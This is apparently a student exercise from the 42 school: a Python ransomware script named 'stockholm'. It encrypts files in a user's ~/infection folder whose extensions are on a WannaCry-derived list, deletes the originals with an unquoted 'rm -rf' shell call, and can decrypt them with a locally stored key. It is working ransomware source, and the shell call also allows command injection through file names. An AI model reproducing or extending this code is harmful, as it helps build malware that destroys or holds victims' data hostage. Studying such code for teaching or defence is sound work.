# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: preina-g <preina-g@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/05/09 19:07:06 by preina-g          #+#    #+#              #
#    Updated: 2023/05/10 12:48:08 by preina-g         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

from cryptography.fernet import Fernet
import argparse
import os

init_dir = []

wannacry = [".der", ".pfx", ".key", ".cr", ".csr", ".p12", ".pem",
            ".od", ".o", ".sxw", ".stw", ".uo", ".3ds", ".max", ".3dm",
            ".txt", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk",
            ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg",
            ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3",
            ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb",
            ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln",
            ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js",
            ".cmd", ".ba", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch",
            ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar",
            ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv",
            ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4",
            ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u",
            ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff",
            ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg",
            ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z",
            ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC",
            ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx",
            ".sti", ".sxi", ".602", ".hwp", ".sn", ".onetoc2", ".dwg",
            ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".tx", ".vsdx",
            ".vsd", ".edb", ".eml", ".msg", ".os", ".ps", ".potm", ".potx",
            ".ppam", ".ppsx", ".ppsm", ".pps", ".po", ".pptm", ".pptx", ".pp",
            ".xltm", ".xltx", ".xlc", ".xlm", ".xl", ".xlw", ".xlsb", ".xlsm",
            ".xlsx", ".xls", ".dotx", ".dotm", ".do", ".docm", ".docb", ".docx", ".doc"]

def encrypt_files(path, silent):
    ext = '.' + path.split('.')[-1]
    if os.path.isfile(path) and ext in wannacry:
        encrypted = Fernet(open('decrypt.key', 'rb').read())
        with open(path, "rb") as raw:
            encrypt_file = encrypted.encrypt(raw.read())
        with open(path + '.ft', "wb") as fina_encrypt:
            fina_encrypt.write(encrypt_file)
            if silent == False:
                print(path + '.ft')
            os.system(f'rm -rf {path}')
    else:
        if silent == False:
            print(path + ' -> INVALID FILE')

def decrypt_files(epath, silent, path):
    if os.path.isfile(epath) and epath.endswith('.ft'):
        with open(epath, 'rb') as file:
            decrypt_key = open('decrypt.key', 'rb').read()
            decode = Fernet(decrypt_key)
            enc_cont = file.read()
            content = decode.decrypt(enc_cont)
        if path == '/Users/{}/infection/'.format(os.environ.get("USER")):
            with open(epath[:-3], 'wb') as d_file:
                if silent == False:
                    print(epath[:-3])
                d_file.write(content)
                os.system(f'rm -rf {epath}')
        elif path != '/Users/{}/infection/'.format(os.environ.get("USER")) and os.path.isdir(path):
            with open(path + epath.split('/')[-1][:-3], 'wb') as d_file:
                if silent == False:
                    print(path + epath.split('/')[-1][:-3])
                d_file.write(content)
                os.system(f'rm -rf {epath}')
    else:
        if silent == False:
            print(epath + ' -> INVALID FILE FOR DECRYPT')

def find_infection(flag, silent, path='/Users/{}/infection/'.format(os.environ.get("USER"))):
    infection = '/Users/{}/infection'.format(os.environ.get("USER"))
    if os.path.isdir(infection) and flag == 1:
        if os.path.isfile('decrypt.key') == False:
            open('decrypt.key', 'wb').write(Fernet.generate_key())
        else:
            pass
        init_dir = os.listdir(infection)
        for file in init_dir:
            encrypt_files(infection + '/' + file, silent)
    elif os.path.isdir(infection) and flag == 2:
        enc_dir = os.listdir(infection)
        for e_file in enc_dir:
            try:
                decrypt_files(infection + '/' + e_file, silent, path)
            except:
                print('INVALID DECRYPT KEY')
    else:
        print('Folder infection not found')

def parser_args():
    parser = argparse.ArgumentParser(description="Small ramsonware that a tack to infection folder at user home")
    parser.add_argument('-v', '--version', action='store_true', help='show stockholm version')
    parser.add_argument('-s', '--silent', action='store_true', help='Execute stockholm in silent mode')
    parser.add_argument('-r', '--reverse', action='store_true', help='Execute stockholm in reverse mode')
    parser.add_argument('-d', '--destine', type=str, help='give a path for rverse mode')
    return parser

args = parser_args().parse_args()
parser = parser_args()

if args.silent:
    if args.reverse:
        find_infection(2, True)
    else:
        find_infection(1, True)
elif args.reverse:
    if args.destine:
        find_infection(2, False, args.destine)
    else:
        find_infection(2, False)
elif args.version:
    print('1.0.0')
else:
    find_infection(1, False)